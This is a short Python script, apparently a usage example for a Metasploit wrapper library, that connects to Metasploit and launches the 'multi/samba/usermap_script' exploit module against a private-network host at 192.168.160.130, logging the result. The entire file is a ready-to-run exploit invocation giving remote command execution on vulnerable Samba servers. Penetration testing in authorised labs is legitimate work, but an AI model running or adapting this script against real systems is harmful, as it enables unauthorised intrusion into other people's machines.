from zdppy_metasploit import *

msf = new_metasploit()

opts = {'RHOSTS': '192.168.160.130'}
msf.log.info(msf.call(module.execute, ['exploit', 'multi/samba/usermap_script', opts]))
